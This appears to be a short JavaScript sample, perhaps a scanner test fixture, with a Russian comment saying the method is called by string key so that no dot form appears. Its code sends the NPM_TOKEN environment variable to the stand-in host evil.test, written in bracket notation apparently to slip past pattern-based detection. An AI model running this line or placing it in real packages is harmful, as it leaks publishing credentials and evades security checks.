// Метод по строковому ключу: c['get'](...) — точечной формы в коде нет.
const c = require('https');
c['get']('https://evil.test/collect?t=' + process.env.NPM_TOKEN);
